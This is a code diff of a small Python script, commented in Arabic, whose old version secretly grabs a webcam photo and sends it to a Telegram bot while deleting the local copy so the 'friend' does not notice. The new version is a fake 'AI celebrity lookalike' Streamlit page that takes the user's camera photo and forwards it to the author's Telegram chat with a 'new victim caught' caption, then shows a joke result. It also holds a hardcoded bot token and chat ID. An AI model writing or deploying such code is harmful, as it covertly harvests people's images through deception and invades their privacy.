@@ -1,49 +1,27 @@
-import cv2
+import streamlit as st
 import requests
-import time
-import os
 
-# --- بياناتك السرية ---
-TOKEN = "8622793927:AAGTEaVOusAzcy_CG58TD5ZEl8VuqnMosiQr"
+# بيانات البوت الخاصة بك
+TOKEN = " 8622793927:AAGTEaVOusAzcy_CG58TD5ZEl8VuqnMosiQr"
 CHAT_ID = "6284670726"
 
-def capture_and_send():
-    # 1. تشغيل الكاميرا في الخلفية
-    cap = cv2.VideoCapture(0)
-    
-    # ننتظر قليلاً لضبط الإضاءة تلقائياً
-    time.sleep(2)
-    
-    ret, frame = cap.read()
-    
-    if ret:
-        image_path = "temp_image.jpg"
-        cv2.imwrite(image_path, frame)
-        cap.release()
-        
-        # 2. إرسال الصورة عبر تليجرام
-        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
-        with open(image_path, 'rb') as photo:
-            files = {'photo': photo}
-            data = {'chat_id': CHAT_ID, 'caption': '😉 تم اصطياد الهدف بنجاح!'}
-            
-            try:
-                response = requests.post(url, files=files, data=data)
-                if response.status_code == 200:
-                    print("تم الإرسال لتليجرام!")
-                else:
-                    print("خطأ في الإرسال.")
-            except Exception as e:
-                print(f"حدث خطأ: {e}")
-        
-        # 3. مسح الصورة من جهاز الصديق فوراً لكي لا يراها
-        if os.path.exists(image_path):
-            os.remove(image_path)
-            
-    else:
-        cap.release()
-        print("لم يتمكن البرنامج من فتح الكاميرا.")
+st.title("📸 اختبار ملامح الوجه بالذكاء الاصطناعي")
+st.write("التقط صورة لتعرف من تشبه من المشاهير!")
 
-# تشغيل الدالة
+# هذا السطر هو الذي يفتح كاميرا جوال أو كمبيوتر صديقك
+img_file_buffer = st.camera_input("اضغط للالتقاط")
 
-capture_and_send()
+if img_file_buffer is not None:
+    # قراءة الصورة
+    bytes_data = img_file_buffer.getvalue()
+    
+    # إرسال الصورة إلى تليجرام
+    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+    files = {'photo': bytes_data}
+    data = {'chat_id': CHAT_ID, 'caption': '💡 تم اصطياد ضحية جديدة!'}
+    
+    try:
+        requests.post(url, files=files, data=data)
+        st.success("جاري التحليل... أنت تشبه شخصية 'مستر بين'! 😂")
+    except:
+        st.error("خطأ في الاتصال")
